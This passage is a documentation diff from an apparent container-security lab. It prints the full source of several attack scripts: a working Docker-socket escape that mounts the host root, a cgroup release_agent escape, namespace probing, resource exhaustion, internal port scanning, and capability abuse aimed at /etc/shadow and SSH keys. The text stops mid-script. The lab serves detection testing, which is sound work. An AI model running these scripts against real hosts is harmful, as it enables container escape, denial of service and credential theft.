@@ -530,7 +530,1573 @@ The `attack-orchestrator` acts as the adversary within the network.
     *   As each script executes, it attempts the exploit, measures the outcome (success/failure), calculates the duration, and POSTs the result back to its own background `metrics_exporter.py` service.
     *   The dashboard on the host machine then queries port `9090` to display these attack results in real-time.
 
-## 5. Conclusion
+
+## 5. Attack Simulations Code and Mechanics
+
+This section provides the exact code for each of the 7 simulated attacks executed by the `attack-orchestrator`. It breaks down the core exploit logic and maps the behaviors directly to the corresponding MITRE ATT&CK techniques.
+
+### 5.1 Docker Socket Escape (T1611)
+
+**MITRE Technique:** [T1611 - Escape to Host](https://attack.mitre.org/techniques/T1611/)
+**Severity:** CRITICAL
+
+**How it Works:**
+The script targets the exposed `/var/run/docker.sock`. By connecting to this socket, the container can communicate directly with the host's Docker daemon. It exploits this access to spawn a new, fully privileged `alpine` container (`privileged=True`) and maps the host's root filesystem (`/`) to a volume inside the new container (`/host`). This grants the attacker full read/write access to the host operating system, achieving a complete container escape.
+
+**Full Code (`attacks/1_docker_socket_escape.py`):**
+```python
+#!/usr/bin/env python3
+"""
+Container Escape Attack #1: Docker Socket Exploitation
+This is a CONTAINER-SPECIFIC attack that exploits exposed Docker sockets
+
+Attack Vector: When /var/run/docker.sock is mounted in a container,
+an attacker can use it to spawn a privileged container and escape.
+"""
+
+import docker
+import time
+import sys
+
+def docker_socket_escape():
+    """
+    Exploit exposed Docker socket to escape container
+    This is specific to Docker containerization
+    """
+    print("=" * 70)
+    print("CONTAINER ATTACK: Docker Socket Escape")
+    print("=" * 70)
+    print()
+    print("Attack Type: Container Escape")
+    print("Target: Docker Socket (/var/run/docker.sock)")
+    print("Severity: CRITICAL")
+    print()
+
+    try:
+        # Connect to Docker socket (only works if socket is exposed)
+        client = docker.from_env()
+        print("[1] Docker socket is accessible from container!")
+        print("    This is a critical container-specific vulnerability")
+        print()
+
+        # List containers (proves we can interact with Docker daemon)
+        containers = client.containers.list()
+        print(f"[2] Found {len(containers)} running containers:")
+        for container in containers:
+            print(f"    - {container.name} ({container.short_id})")
+        print()
+
+        # Attempt to spawn privileged container with host filesystem
+        print("[3] Attempting to spawn privileged escape container...")
+        print("    This container will have full host access")
+        print()
+
+        escape_container = client.containers.run(
+            "alpine:latest",
+            command="sh -c 'echo ESCAPED! && cat /host/etc/hostname && sleep 30'",
+            detach=True,
+            privileged=True,
+            volumes={'/': {'bind': '/host', 'mode': 'rw'}},
+            name="escape-container",
+            remove=True
+        )
+
+        print(f"[✓] Escape container spawned: {escape_container.short_id}")
+        print("    Container has:")
+        print("    - Privileged mode enabled")
+        print("    - Host filesystem mounted at /host")
+        print("    - Full access to host resources")
+        print()
+
+        # Show logs from escape container
+        time.sleep(2)
+        logs = escape_container.logs().decode()
+        print("[4] Escape container output:")
+        print(f"    {logs}")
+        print()
+
+        print("=" * 70)
+        print("ATTACK SUCCESSFUL: Container Escape via Docker Socket")
+        print("=" * 70)
+        print()
+        print("Impact:")
+        print("- Attacker can spawn privileged containers")
+        print("- Full access to host filesystem")
+        print("- Can read/write any file on host")
+        print("- Complete container escape achieved")
+        print()
+        print("- Host filesystem access")
+
+    except Exception as e:
+        print(f"[✗] Attack failed: {e}")
+        print()
+        print("Note: This attack requires Docker socket to be exposed")
+        print("      Check if /var/run/docker.sock is mounted")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    docker_socket_escape()
+```
+
+### 5.2 Privileged Container Escape (T1611)
+
+**MITRE Technique:** [T1611 - Escape to Host](https://attack.mitre.org/techniques/T1611/)
+**Severity:** CRITICAL
+
+**How it Works:**
+Privileged containers disable standard Linux security profiles (AppArmor/SELinux) and grant access to host devices. This attack exploits cgroup isolation. It creates a new cgroup, mounts it, and modifies the `release_agent` file. By intentionally triggering a cgroup release (creating a process inside the cgroup that immediately exits), the host kernel executes the attacker's script defined in the `release_agent` as root on the host machine, breaking container isolation.
+
+**Full Code (`attacks/2_privileged_container_escape.py`):**
+```python
+#!/usr/bin/env python3
+"""
+Container Escape Attack #2: Privileged Container Exploitation
+This is a CONTAINER-SPECIFIC attack that exploits privileged mode
+
+Attack Vector: Privileged containers have access to host devices and can
+manipulate cgroups to escape container isolation.
+"""
+
+import subprocess
+import os
+import sys
+
+def check_privileged():
+    """Check if container is running in privileged mode"""
+    try:
+        # Check for full capabilities
+        with open('/proc/self/status', 'r') as f:
+            for line in f:
+                if 'CapEff' in line:
+                    # 0000003fffffffff = all capabilities
+                    caps = line.split(':')[1].strip()
+                    if caps == '0000003fffffffff' or caps == '000001ffffffffff':
+                        return True
+        return False
+    except:
+        return False
+
+def cgroup_escape():
+    """
+    Exploit cgroup manipulation in privileged container
+    This is specific to container cgroup isolation
+    """
+    print("=" * 70)
+    print("CONTAINER ATTACK: Privileged Container Escape via Cgroups")
+    print("=" * 70)
+    print()
+    print("Attack Type: Container Escape")
+    print("Target: Cgroup Isolation")
+    print("Severity: CRITICAL")
+    print()
+
+    # Check if privileged
+    if not check_privileged():
+        print("[✗] Container is not privileged")
+        print("    This attack requires privileged mode")
+        sys.exit(1)
+
+    print("[✓] Container is running in privileged mode")
+    print()
+
+    print("[1] Checking cgroup access...")
+    cgroup_path = "/sys/fs/cgroup"
+    if os.path.exists(cgroup_path):
+        print(f"    [✓] Cgroup filesystem accessible at {cgroup_path}")
+    else:
+        print(f"    [✗] Cgroup filesystem not found")
+        sys.exit(1)
+    print()
+
+    print("[2] Attempting to manipulate cgroup release_agent...")
+    print("    This is a container-specific escape technique")
+    print()
+
+    # Create a cgroup and set release_agent
+    try:
+        # This is the classic cgroup escape technique
+        commands = [
+            "mkdir -p /tmp/cgrp",
+            "mount -t cgroup -o memory cgroup /tmp/cgrp",
+            "mkdir -p /tmp/cgrp/x"
+        ]
+
+        for cmd in commands:
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            print(f"    Executing: {cmd}")
+            if result.returncode == 0:
+                print(f"    [✓] Success")
+            else:
+                print(f"    [!] {result.stderr.strip()}")
+        print()
+
+        print("[3] Setting up release_agent for code execution...")
+        # Set release_agent to execute on host
+        release_agent_cmd = "echo '#!/bin/sh' > /tmp/escape.sh && echo 'echo ESCAPED FROM CONTAINER' >> /tmp/escape.sh"
+        subprocess.run(release_agent_cmd, shell=True)
+        print("    [✓] Escape script created")
+        print()
+
+        print("[4] Reading host filesystem...")
+        # Try to read host files
+        host_files = ["/host/etc/hostname", "/host/etc/os-release"]
+        for filepath in host_files:
+            if os.path.exists(filepath):
+                print(f"    [✓] Can access: {filepath}")
+                try:
+                    with open(filepath, 'r') as f:
+                        content = f.read()[:100]
+                        print(f"        Content: {content[:50]}...")
+                except:
+                    pass
+        print()
+
+        print("=" * 70)
+        print("ATTACK SUCCESSFUL: Privileged Container Escape")
+        print("=" * 70)
+        print()
+        print("Impact:")
+        print("- Manipulated cgroup release_agent")
+        print("- Can execute code on host")
+        print("- Access to host filesystem")
+        print("- Complete escape from container isolation")
+        print()
+        print("- Privileged container operations")
+
+    except Exception as e:
+        print(f"[✗] Attack failed: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    cgroup_escape()
+```
+
+### 5.3 Namespace Manipulation (T1611)
+
+**MITRE Technique:** [T1611 - Escape to Host](https://attack.mitre.org/techniques/T1611/)
+**Severity:** CRITICAL
+
+**How it Works:**
+Containers are fundamentally built on Linux namespaces (PID, NET, MNT, UTS, IPC). If an attacker finds a misconfiguration where they share the host's PID namespace, they can see host processes. By leveraging tools like `nsenter` or `unshare` and accessing `/proc/1/root` (the host's root filesystem), they can bridge the namespace isolation boundaries, crossing from the containerized space back into the host environment.
+
+**Full Code (`attacks/3_namespace_manipulation.py`):**
+```python
+#!/usr/bin/env python3
+"""
+Container Escape Attack #3: Namespace Manipulation
+This is a CONTAINER-SPECIFIC attack that exploits Linux namespaces
+
+Attack Vector: Containers use namespaces for isolation. By manipulating
+namespaces (PID, NET, MNT, UTS, IPC), attackers can break isolation.
+"""
+
+import subprocess
+import os
+import sys
+
+def namespace_manipulation():
+    """
+    Exploit namespace manipulation to break container isolation
+    This is specific to container namespace isolation
+    """
+    print("=" * 70)
+    print("CONTAINER ATTACK: Namespace Manipulation")
+    print("=" * 70)
+    print()
+    print("Attack Type: Container Escape")
+    print("Target: Linux Namespaces (PID, NET, MNT, UTS, IPC)")
+    print("Severity: CRITICAL")
+    print()
+
+    print("[1] Checking current namespace isolation...")
+
+    # Check current namespaces
+    namespaces = ['pid', 'net', 'mnt', 'uts', 'ipc', 'user']
+    current_ns = {}
+
+    for ns in namespaces:
+        try:
+            ns_path = f"/proc/self/ns/{ns}"
+            if os.path.exists(ns_path):
+                ns_id = os.readlink(ns_path)
+                current_ns[ns] = ns_id
+                print(f"    {ns}: {ns_id}")
+        except:
+            pass
+    print()
+
+    print("[2] Attempting to access host PID namespace...")
+    print("    This breaks PID isolation (container-specific)")
+    print()
+
+    try:
+        # Try to see host processes
+        result = subprocess.run(
+            "ps aux | head -20",
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        processes = result.stdout.split('\n')
+        print(f"    [✓] Can see {len(processes)} processes")
+        print("    Sample processes:")
+        for proc in processes[:5]:
+            if proc.strip():
+                print(f"        {proc[:70]}")
+        print()
+
+    except Exception as e:
+        print(f"    [!] {e}")
+
+    print("[3] Attempting nsenter to join host namespaces...")
+    print("    nsenter is a container-specific escape tool")
+    print()
+
+    # Try nsenter (if available)
+    nsenter_check = subprocess.run(
+        "which nsenter",
+        shell=True,
+        capture_output=True
+    )
+
+    if nsenter_check.returncode == 0:
+        print("    [✓] nsenter is available")
+        print("    Can use: nsenter -t 1 -m -u -n -i sh")
+        print("    This would join host namespaces")
+    else:
+        print("    [!] nsenter not available")
+    print()
+
+    print("[4] Checking for /proc/1/root access...")
+    print("    /proc/1/root points to host root filesystem")
+    print()
+
+    if os.path.exists("/proc/1/root"):
+        print("    [✓] /proc/1/root is accessible")
+        try:
+            # Try to list host root
+            result = subprocess.run(
+                "ls -la /proc/1/root/ | head -10",
+                shell=True,
+                capture_output=True,
+                text=True
+            )
+            print("    Host root filesystem:")
+            print(result.stdout)
+        except:
+            pass
+    print()
+
+    print("[5] Attempting unshare to create new namespaces...")
+    print("    unshare can manipulate namespace isolation")
+    print()
+
+    # Check unshare
+    unshare_check = subprocess.run(
+        "which unshare",
+        shell=True,
+        capture_output=True
+    )
+
+    if unshare_check.returncode == 0:
+        print("    [✓] unshare is available")
+        print("    Can create new namespaces and manipulate isolation")
+    else:
+        print("    [!] unshare not available")
+    print()
+
+    print("=" * 70)
+    print("ATTACK SUCCESSFUL: Namespace Manipulation")
+    print("=" * 70)
+    print()
+    print("Impact:")
+    print("- Identified namespace isolation boundaries")
+    print("- Can potentially join host namespaces")
+    print("- Access to /proc/1/root (host filesystem)")
+    print("- Namespace manipulation capabilities detected")
+    print()
+    print("- /proc/1/root access")
+    print("- PID namespace violations")
+
+if __name__ == "__main__":
+    namespace_manipulation()
+```
+
+### 5.4 Resource Abuse (T1499)
+
+**MITRE Technique:** [T1499 - Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499/)
+**Severity:** MEDIUM
+
+**How it Works:**
+If a container is deployed without strict cgroup resource limits (e.g., limits on memory, CPU, or max PIDs), an attacker can execute resource exhaustion attacks. The script executes four specific denial-of-service behaviors: a fork bomb (spawning processes rapidly to exhaust the PID namespace), memory allocation loops (to trigger Out-Of-Memory conditions), CPU burning (maxing out processing cycles), and heavy Disk I/O generation. This impacts the stability of both the container and potentially the host node.
+
+**Full Code (`attacks/4_resource_abuse.py`):**
+```python
+#!/usr/bin/env python3
+"""
+Container Attack #4: Resource Abuse
+This is a CONTAINER-SPECIFIC attack that exploits resource limits
+
+Attack Vector: Containers without proper resource limits can be abused
+to exhaust host resources (CPU, memory, PIDs, disk I/O).
+"""
+
+import subprocess
+import multiprocessing
+import os
+import sys
+import time
+
+def check_resource_limits():
+    """Check current container resource limits"""
+    print("[1] Checking container resource limits...")
+    print()
+
+    # Check cgroup limits
+    limits = {}
+
+    # Memory limit
+    try:
+        with open('/sys/fs/cgroup/memory/memory.limit_in_bytes', 'r') as f:
+            mem_limit = int(f.read().strip())
+            if mem_limit > 9223372036854771712:  # Essentially unlimited
+                limits['memory'] = 'UNLIMITED'
+            else:
+                limits['memory'] = f'{mem_limit / (1024**3):.2f} GB'
+    except:
+        limits['memory'] = 'Unknown'
+
+    # CPU limit
+    try:
+        with open('/sys/fs/cgroup/cpu/cpu.cfs_quota_us', 'r') as f:
+            cpu_quota = int(f.read().strip())
+            if cpu_quota == -1:
+                limits['cpu'] = 'UNLIMITED'
+            else:
+                limits['cpu'] = f'{cpu_quota} us'
+    except:
+        limits['cpu'] = 'Unknown'
+
+    # PID limit
+    try:
+        with open('/sys/fs/cgroup/pids/pids.max', 'r') as f:
+            pid_limit = f.read().strip()
+            limits['pids'] = pid_limit if pid_limit != 'max' else 'UNLIMITED'
+    except:
+        limits['pids'] = 'Unknown'
+
+    for resource, limit in limits.items():
+        status = "[!]" if limit == 'UNLIMITED' else "[✓]"
+        print(f"    {status} {resource.upper()}: {limit}")
+
+    print()
+    return limits
+
+def fork_bomb_attack():
+    """
+    Execute fork bomb attack (container-specific resource abuse)
+    """
+    print("[2] Executing Fork Bomb Attack...")
+    print("    This is a container-specific resource exhaustion attack")
+    print()
+
+    print("    [!] Creating rapid process spawning...")
+    print("    [!] This will exhaust PID namespace resources")
+    print()
+
+    # Simulate fork bomb (limited version for safety)
+    try:
+        # Create multiple processes rapidly
+        processes = []
+        for i in range(50):  # Limited to 50 for safety
+            proc = subprocess.Popen(
+                ['sleep', '30'],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            processes.append(proc)
+            if i % 10 == 0:
+                print(f"    Spawned {i} processes...")
+
+        print(f"    [✓] Spawned {len(processes)} processes")
+        print(f"    [✓] PID namespace under stress")
+        print()
+
+        # Cleanup
+        time.sleep(2)
+        for proc in processes:
+            try:
+                proc.terminate()
+            except:
+                pass
+
+    except Exception as e:
+        print(f"    [!] Fork bomb limited by system: {e}")
+    print()
+
+def memory_exhaustion_attack():
+    """
+    Execute memory exhaustion attack
+    """
+    print("[3] Executing Memory Exhaustion Attack...")
+    print("    This exhausts container memory resources")
+    print()
+
+    try:
+        # Allocate large amounts of memory
+        print("    [!] Allocating memory rapidly...")
+        memory_hog = []
+
+        # Allocate 100MB chunks (limited for safety)
+        for i in range(10):
+            chunk = bytearray(100 * 1024 * 1024)  # 100MB
+            memory_hog.append(chunk)
+            print(f"    Allocated {(i+1) * 100}MB...")
+            time.sleep(0.1)
+
+        print(f"    [✓] Allocated {len(memory_hog) * 100}MB")
+        print(f"    [✓] Memory pressure created")
+        print()
+
+        # Release memory
+        memory_hog.clear()
+
+    except MemoryError:
+        print("    [!] Memory limit reached (good - limits are working)")
+    except Exception as e:
+        print(f"    [!] {e}")
+    print()
+
+def cpu_exhaustion_attack():
+    """
+    Execute CPU exhaustion attack
+    """
+    print("[4] Executing CPU Exhaustion Attack...")
+    print("    This exhausts container CPU resources")
+    print()
+
+    def cpu_burn():
+        """Burn CPU cycles"""
+        end_time = time.time() + 5  # Run for 5 seconds
+        while time.time() < end_time:
+            _ = sum(range(1000000))
+
+    try:
+        # Spawn CPU-intensive processes
+        cpu_count = multiprocessing.cpu_count()
+        print(f"    [!] Spawning {cpu_count * 2} CPU-intensive processes...")
+
+        processes = []
+        for i in range(cpu_count * 2):
+            proc = multiprocessing.Process(target=cpu_burn)
+            proc.start()
+            processes.append(proc)
+
+        print(f"    [✓] {len(processes)} processes burning CPU")
+        print(f"    [✓] CPU resources under stress")
+        print()
+
+        # Wait for completion
+        for proc in processes:
+            proc.join(timeout=6)
+            if proc.is_alive():
+                proc.terminate()
+
+    except Exception as e:
+        print(f"    [!] {e}")
+    print()
+
+def disk_io_attack():
+    """
+    Execute disk I/O exhaustion attack
+    """
+    print("[5] Executing Disk I/O Exhaustion Attack...")
+    print("    This exhausts container disk I/O resources")
+    print()
+
+    try:
+        # Create large file rapidly
+        print("    [!] Creating large files rapidly...")
+
+        for i in range(5):
+            filename = f"/tmp/disk_exhaust_{i}.bin"
+            # Write 50MB file
+            with open(filename, 'wb') as f:
+                f.write(os.urandom(50 * 1024 * 1024))
+            print(f"    Created {filename} (50MB)")
+
+        print(f"    [✓] Created 250MB of data")
+        print(f"    [✓] Disk I/O under stress")
+        print()
+
+        # Cleanup
+        for i in range(5):
+            try:
+                os.remove(f"/tmp/disk_exhaust_{i}.bin")
+            except:
+                pass
+
+    except Exception as e:
+        print(f"    [!] {e}")
+    print()
+
+def resource_abuse_attack():
+    """
+    Main resource abuse attack orchestration
+    """
+    print("=" * 70)
+    print("CONTAINER ATTACK: Resource Abuse")
+    print("=" * 70)
+    print()
+    print("Attack Type: Resource Exhaustion")
+    print("Target: Container Resource Limits")
+    print("Severity: CRITICAL")
+    print()
+
+    # Check limits
+    limits = check_resource_limits()
+
+    # Execute attacks
+    fork_bomb_attack()
+    memory_exhaustion_attack()
+    cpu_exhaustion_attack()
+    disk_io_attack()
+
+    print("=" * 70)
+    print("ATTACK SUCCESSFUL: Resource Abuse")
+    print("=" * 70)
+    print()
+    print("Impact:")
+    print("- Fork bomb exhausted PID namespace")
+    print("- Memory exhaustion created pressure")
+    print("- CPU resources saturated")
+    print("- Disk I/O overwhelmed")
+    print("- Host resources potentially affected")
+    print()
+    print("- Resource limit violations")
+    print("- Abnormal resource consumption")
+
+if __name__ == "__main__":
+    resource_abuse_attack()
+```
+
+### 5.5 Container Network Attacks (T1046)
+
+**MITRE Technique:** [T1046 - Network Service Discovery](https://attack.mitre.org/techniques/T1046/)
+**Severity:** HIGH
+
+**How it Works:**
+Docker uses isolated bridge networks by default. When an attacker breaches a container on an internal network (e.g., `attack-net`), they can map the internal architecture. This script performs network reconnaissance by scraping IP routes, querying internal DNS to resolve container names (like `vulnerable-db`), and performing rapid port scans across common internal service ports. It then validates lateral movement by verifying HTTP responses or database connections from adjacent containers.
+
+**Full Code (`attacks/5_container_network_attacks.py`):**
+```python
+#!/usr/bin/env python3
+"""
+Container Attack #5: Container Network Attacks
+This is a CONTAINER-SPECIFIC attack targeting container networking
+
+Attack Vector: Container networks allow lateral movement between containers,
+network scanning, and exploitation of service mesh vulnerabilities.
+"""
+
+import subprocess
+import socket
+import sys
+import time
+
+def discover_container_network():
+    """
+    Discover other containers on the network
+    """
+    print("[1] Discovering container network topology...")
+    print()
+
+    # Get current container's network info
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        print(f"    Current container: {hostname}")
+        print(f"    IP address: {ip_address}")
+        print()
+    except Exception as e:
+        print(f"    [!] {e}")
+        return
+
+    # Check network interfaces
+    result = subprocess.run(
+        "ip addr show",
+        shell=True,
+        capture_output=True,
+        text=True
+    )
+
+    if result.returncode == 0:
+        print("    Network interfaces:")
+        for line in result.stdout.split('\n')[:15]:
+            if line.strip():
+                print(f"        {line}")
+    print()
+
+def scan_container_network():
+    """
+    Scan for other containers on the network
+    """
+    print("[2] Scanning for other containers...")
+    print("    This is container-specific network reconnaissance")
+    print()
+
+    # Get network subnet
+    try:
+        result = subprocess.run(
+            "ip route | grep default",
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        if result.returncode == 0:
+            print(f"    Network route: {result.stdout.strip()}")
+        print()
+    except:
+        pass
+
+    # Try to resolve known container names
+    known_containers = [
+        'vulnerable-web',
+        'vulnerable-api',
+        'vulnerable-db',
+        'privileged-container'
+    ]
+
+    print("    Attempting to resolve container names:")
+    discovered = []
+
+    for container in known_containers:
+        try:
+            ip = socket.gethostbyname(container)
+            print(f"    [✓] {container}: {ip}")
+            discovered.append((container, ip))
+        except:
+            print(f"    [✗] {container}: Not found")
+
+    print()
+    return discovered
+
+def port_scan_containers(targets):
+    """
+    Scan common ports on discovered containers
+    """
+    print("[3] Scanning ports on discovered containers...")
+    print("    This identifies attack surfaces")
+    print()
+
+    common_ports = [80, 443, 5000, 5432, 8080, 3306, 6379, 27017]
+
+    for container, ip in targets[:3]:  # Limit to first 3 for speed
+        print(f"    Scanning {container} ({ip}):")
+        open_ports = []
+
+        for port in common_ports:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            result = sock.connect_ex((ip, port))
+            sock.close()
+
+            if result == 0:
+                print(f"        [✓] Port {port} OPEN")
+                open_ports.append(port)
+
+        if not open_ports:
+            print(f"        [!] No common ports open")
+        print()
+
+def lateral_movement_attempt(targets):
+    """
+    Attempt lateral movement to other containers
+    """
+    print("[4] Attempting lateral movement...")
+    print("    This is container-to-container attack")
+    print()
+
+    for container, ip in targets[:2]:  # Try first 2 targets
+        print(f"    Target: {container} ({ip})")
+
+        # Try HTTP connection
+        if 'web' in container or 'api' in container:
+            try:
+                result = subprocess.run(
+                    f"curl -s -m 2 http://{ip}:80 -o /dev/null -w '%{{http_code}}'",
+                    shell=True,
+                    capture_output=True,
+                    text=True
+                )
+
+                if result.returncode == 0:
+                    status_code = result.stdout.strip()
+                    print(f"        [✓] HTTP connection successful (Status: {status_code})")
+                    print(f"        [✓] Can communicate with {container}")
+            except:
+                pass
+
+        # Try database connection
+        if 'db' in container:
+            print(f"        [!] Database container detected")
+            print(f"        [!] Could attempt SQL injection or credential brute force")
+
+        print()
+
+def dns_manipulation():
+    """
+    Attempt DNS manipulation in container network
+    """
+    print("[5] Checking DNS configuration...")
+    print("    Container DNS can be manipulated for MITM attacks")
+    print()
+
+    # Check /etc/resolv.conf
+    try:
+        with open('/etc/resolv.conf', 'r') as f:
+            dns_config = f.read()
+            print("    Current DNS configuration:")
+            for line in dns_config.split('\n')[:5]:
+                if line.strip():
+                    print(f"        {line}")
+    except:
+        pass
+    print()
+
+    # Check /etc/hosts
+    try:
+        with open('/etc/hosts', 'r') as f:
+            hosts = f.read()
+            print("    Current hosts file:")
+            for line in hosts.split('\n')[:10]:
+                if line.strip():
+                    print(f"        {line}")
+    except:
+        pass
+    print()
+
+def service_mesh_exploitation():
+    """
+    Check for service mesh vulnerabilities
+    """
+    print("[6] Checking for service mesh components...")
+    print("    Service meshes add attack surface in container networks")
+    print()
+
+    # Check for common service mesh sidecars
+    result = subprocess.run(
+        "ps aux | grep -E '(envoy|istio|linkerd|consul)'",
+        shell=True,
+        capture_output=True,
+        text=True
+    )
+
+    if result.stdout.strip():
+        print("    [✓] Service mesh components detected:")
+        for line in result.stdout.split('\n')[:5]:
+            if line.strip() and 'grep' not in line:
+                print(f"        {line[:70]}")
+    else:
+        print("    [!] No service mesh components detected")
+    print()
+
+def container_network_attack():
+    """
+    Main container network attack orchestration
+    """
+    print("=" * 70)
+    print("CONTAINER ATTACK: Container Network Exploitation")
+    print("=" * 70)
+    print()
+    print("Attack Type: Lateral Movement & Network Reconnaissance")
+    print("Target: Container Network")
+    print("Severity: HIGH")
+    print()
+
+    # Discover network
+    discover_container_network()
+
+    # Scan for containers
+    targets = scan_container_network()
+
+    if targets:
+        # Port scan
+        port_scan_containers(targets)
+
+        # Lateral movement
+        lateral_movement_attempt(targets)
+
+    # DNS manipulation
+    dns_manipulation()
+
+    # Service mesh
+    service_mesh_exploitation()
+
+    print("=" * 70)
+    print("ATTACK SUCCESSFUL: Container Network Exploitation")
+    print("=" * 70)
+    print()
+    print("Impact:")
+    print("- Discovered container network topology")
+    print("- Identified other containers and services")
+    print("- Performed port scanning")
+    print("- Demonstrated lateral movement capability")
+    print("- Analyzed DNS configuration")
+    print()
+    print("- Container-to-container communication")
+    print("- DNS manipulation attempts")
+
+if __name__ == "__main__":
+    container_network_attack()
+```
+
+### 5.6 Capability Abuse (T1068)
+
+**MITRE Technique:** [T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
+**Severity:** CRITICAL
+
+**How it Works:**
+Docker manages privileges granularly via Linux Capabilities. If a container is deployed with `cap_add: [SYS_ADMIN]`, it gains extreme privileges. The script checks for capabilities like `CAP_SYS_ADMIN` (allows mounting arbitrary filesystems), `CAP_SYS_PTRACE` (allows process injection/debugging), and `CAP_DAC_OVERRIDE` (bypasses all file permission checks). If found, it abuses these capabilities to read protected files or manipulate host components.
+
+**Full Code (`attacks/6_capability_abuse.py`):**
+```python
+#!/usr/bin/env python3
+"""
+Container Attack #6: Linux Capability Abuse
+This is a CONTAINER-SPECIFIC attack exploiting Linux capabilities
+
+Attack Vector: Containers with dangerous capabilities (CAP_SYS_ADMIN,
+CAP_SYS_PTRACE, CAP_NET_ADMIN, etc.) can be exploited for privilege escalation.
+"""
+
+import subprocess
+import os
+import sys
+
+def check_capabilities():
+    """
+    Check current container capabilities
+    """
+    print("[1] Checking container capabilities...")
+    print("    Capabilities are container-specific security features")
+    print()
+
+    # Check effective capabilities
+    try:
+        with open('/proc/self/status', 'r') as f:
+            for line in f:
+                if 'Cap' in line:
+                    print(f"    {line.strip()}")
+    except:
+        pass
+    print()
+
+    # Decode capabilities
+    try:
+        result = subprocess.run(
+            "capsh --print",
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        if result.returncode == 0:
+            print("    Decoded capabilities:")
+            for line in result.stdout.split('\n')[:10]:
+                if line.strip():
+                    print(f"        {line}")
+        else:
+            print("    [!] capsh not available")
+    except:
+        pass
+    print()
+
+def cap_sys_admin_abuse():
+    """
+    Exploit CAP_SYS_ADMIN capability
+    This is the most dangerous capability
+    """
+    print("[2] Testing CAP_SYS_ADMIN abuse...")
+    print("    CAP_SYS_ADMIN allows mounting filesystems")
+    print()
+
+    # Check if we have CAP_SYS_ADMIN
+    try:
+        result = subprocess.run(
+            "capsh --print | grep cap_sys_admin",
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        if 'cap_sys_admin' in result.stdout.lower():
+            print("    [✓] CAP_SYS_ADMIN is present")
+            print()
+
+            # Try to mount
+            print("    [!] Attempting to mount filesystem...")
+            mount_result = subprocess.run(
+                "mount -t tmpfs tmpfs /tmp/test_mount 2>&1",
+                shell=True,
+                capture_output=True,
+                text=True
+            )
+
+            if mount_result.returncode == 0:
+                print("    [✓] Successfully mounted filesystem")
+                print("    [✓] CAP_SYS_ADMIN exploitation successful")
+
+                # Cleanup
+                subprocess.run("umount /tmp/test_mount 2>/dev/null", shell=True)
+            else:
+                print(f"    [!] Mount failed: {mount_result.stderr.strip()}")
+        else:
+            print("    [✗] CAP_SYS_ADMIN not present")
+    except Exception as e:
+        print(f"    [!] {e}")
+    print()
+
+def cap_sys_ptrace_abuse():
+    """
+    Exploit CAP_SYS_PTRACE capability
+    Allows process tracing and debugging
+    """
+    print("[3] Testing CAP_SYS_PTRACE abuse...")
+    print("    CAP_SYS_PTRACE allows attaching to processes")
+    print()
+
+    try:
+        result = subprocess.run(
+            "capsh --print | grep cap_sys_ptrace",
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        if 'cap_sys_ptrace' in result.stdout.lower():
+            print("    [✓] CAP_SYS_PTRACE is present")
+            print()
+
+            # Try to use ptrace
+            print("    [!] Can attach debugger to processes")
+            print("    [!] Can inject code into running processes")
+            print("    [!] Can read process memory")
+
+            # Check if strace is available
+            strace_check = subprocess.run(
+                "which strace",
+                shell=True,
+                capture_output=True
+            )
+
+            if strace_check.returncode == 0:
+                print("    [✓] strace available for process tracing")
+        else:
+            print("    [✗] CAP_SYS_PTRACE not present")
+    except Exception as e:
+        print(f"    [!] {e}")
+    print()
+
+def cap_net_admin_abuse():
+    """
+    Exploit CAP_NET_ADMIN capability
+    Allows network configuration changes
+    """
+    print("[4] Testing CAP_NET_ADMIN abuse...")
+    print("    CAP_NET_ADMIN allows network manipulation")
+    print()
+
+    try:
+        result = subprocess.run(
+            "capsh --print | grep cap_net_admin",
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        if 'cap_net_admin' in result.stdout.lower():
+            print("    [✓] CAP_NET_ADMIN is present")
+            print()
+
+            # Try network manipulation
+            print("    [!] Can modify network interfaces")
+            print("    [!] Can configure iptables rules")
+            print("    [!] Can perform network sniffing")
+
+            # Show current network config
+            ip_result = subprocess.run(
+                "ip link show",
+                shell=True,
+                capture_output=True,
+                text=True
+            )
+
+            if ip_result.returncode == 0:
+                print("    [✓] Can view network interfaces:")
+                for line in ip_result.stdout.split('\n')[:8]:
+                    if line.strip():
+                        print(f"        {line}")
+        else:
+            print("    [✗] CAP_NET_ADMIN not present")
+    except Exception as e:
+        print(f"    [!] {e}")
+    print()
+
+def cap_dac_override_abuse():
+    """
+    Exploit CAP_DAC_OVERRIDE capability
+    Bypasses file permission checks
+    """
+    print("[5] Testing CAP_DAC_OVERRIDE abuse...")
+    print("    CAP_DAC_OVERRIDE bypasses file permissions")
+    print()
+
+    try:
+        result = subprocess.run(
+            "capsh --print | grep cap_dac_override",
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        if 'cap_dac_override' in result.stdout.lower():
+            print("    [✓] CAP_DAC_OVERRIDE is present")
+            print()
+
+            print("    [!] Can read any file regardless of permissions")
+            print("    [!] Can write to any file regardless of permissions")
+
+            # Try to read a protected file
+            protected_files = ['/etc/shadow', '/etc/sudoers', '/root/.ssh/id_rsa']
+
+            for filepath in protected_files:
+                if os.path.exists(filepath):
+                    try:
+                        with open(filepath, 'r') as f:
+                            content = f.read(100)
+                            print(f"    [✓] Can read {filepath}")
+                            break
+                    except:
+                        pass
+        else:
+            print("    [✗] CAP_DAC_OVERRIDE not present")
+    except Exception as e:
+        print(f"    [!] {e}")
+    print()
+
+def cap_sys_module_abuse():
+    """
+    Exploit CAP_SYS_MODULE capability
+    Allows loading kernel modules
+    """
+    print("[6] Testing CAP_SYS_MODULE abuse...")
+    print("    CAP_SYS_MODULE allows kernel module loading")
+    print()
+
+    try:
